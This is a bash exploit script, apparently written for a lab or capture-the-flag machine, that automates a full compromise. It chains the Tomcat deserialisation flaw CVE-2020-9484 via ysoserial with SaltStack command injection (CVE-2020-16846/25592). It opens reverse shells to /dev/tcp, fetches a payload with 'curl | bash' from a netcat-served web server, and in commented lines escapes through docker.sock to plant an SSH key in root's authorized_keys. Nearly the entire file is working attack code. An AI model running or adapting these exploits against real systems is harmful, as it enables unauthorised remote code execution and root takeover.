#!/bin/bash

set -eu

ip=$(ip address show dev tun0 | grep -oP 'inet (\d+\.\d+\d+\.\d+\.\d+)' | awk '{print $2}')
port=8080
t_ip=10.10.10.205
t_port=8080
u_path=../../../../../opt/samples/uploads/

# Epxloit CVE-2020-9484
rce(){
  local command=$1 
  local name="nolinks$(xxd -p -l 4 /dev/random)"
  local shell=$(echo $command | base64 -w0)
  local payload="bash -c {echo,${shell}}|{base64,-d}|{bash,-i}"
  java -jar ysoserial.jar CommonsCollections2 "$payload" > "$name.session"
  target_url=http://$t_ip:$t_port/upload.jsp?email=$name
  curl -sq --cookie "JSESSIONID=$u_path$name" -F "image=@$name.session" $target_url
  curl -sq --cookie "JSESSIONID=$u_path$name" $target_url
  rm "$name.session"
}



foothold(){
  #### Exploit CVE-2020-9484
  cmd="bash -i >& /dev/tcp/$ip/$port 0>&1"
  rce "$cmd" 
  netcat -lvnp $port
}

user() {
  ## Exploit CVE-2020-16846, CVE-2020-25592
  url="https://172.17.0.2:8000"
  payload="curl http://$ip:8000/ | bash"
  callback=$(echo -e "#!/bin/bash\n\nbash -i> /dev/tcp/$ip/$port 0>&1")
  cmd="curl -sk $url/run -X POST -H 'Content-Type: application/json' -d '{\"client\":\"ssh\",\"tgt\":\"*\",\"fun\":\"414141414114\",\"eauth\":\"42424242424224\",\"ssh_priv\":\"/dev/null < /dev/null & ($payload) & #\"}'"
  # Simple Webserver
  ( cat << EOF 
HTTP/1.0 200 OK
Date: $(date)
Content-type: text/plain
Content-Length: ${#callback}

$callback
EOF
sleep 1
) | netcat -lvnp 8000 &
  rce "$cmd"
  netcat -lvnp $port
}
#python3 -c 'import pty;pty.spawn("/bin/bash");'

#### Exploit access to docker.sock
#container_id=$(curl -s -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"188a2704d8b0","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Volumes": {"/hostos/": {}}, "HostConfig": {"Binds": ["/:/hostos"], "Privileged": true}}' http://localhost/containers/create | grep -oP '(?<="Id":")\w+')
#curl -s -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/$container_id/start
#exec_id=$(curl -i -s -X POST --unix-socket /var/run/docker.sock -H "Content-Type: application/json" --data-binary '{"AttachStdin": true,"AttachStdout": true,"AttachStderr": true,"Cmd": ["mkdir /root/.ssh;curl http://10.10.14.181:8000/ssh -o /root/.ssh/authorized_keys"],"DetachKeys": "ctrl-p,ctrl-q","Privileged": true,"Tty": true}' http://localhost/containers/$container_id/exec | grep -oP '(?<="Id":")\w+')
#curl -i -s -X POST --unix-socket /var/run/docker.sock -H 'Content-Type: application/json' --data-binary '{"Detach": false,"Tty": true}' http://localhost/exec/$exec_id/start



while getopts “fu::” opt; do
  case $opt in
      f) foothold ;;
      u) user ;;
      *) echo "Error"
  esac
done
